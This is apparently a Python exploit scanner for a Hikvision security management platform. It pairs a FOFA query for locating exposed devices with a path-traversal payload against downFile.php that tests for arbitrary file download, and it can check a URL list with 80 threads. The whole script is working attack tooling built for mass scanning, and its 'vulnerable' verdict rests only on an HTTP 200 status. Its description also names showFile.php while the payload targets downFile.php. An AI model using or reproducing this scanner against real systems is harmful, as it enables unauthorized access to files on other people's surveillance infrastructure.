#fofa app="HIKVISION-综合安防管理平台"

import requests,sys,argparse,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
            ██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗
            ██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║
            ███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║
            ██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║
            ██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║
            ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                author:秋妤
                                                                date:2024.09.13
                                                                version:1.0
"""
    print(test)

def poc(target):
    payload = '/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php'
    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
    }
    res = requests.get(url=target + payload,headers=headers,verify=False)
    if res.status_code == 200:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[-]{target}不存在漏洞')


def main():
    banner()
    parser = argparse.ArgumentParser(description='HIKVISION视频编码设备接入网关showFile.php任意文件下载')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")



if __name__ =='__main__':
    main()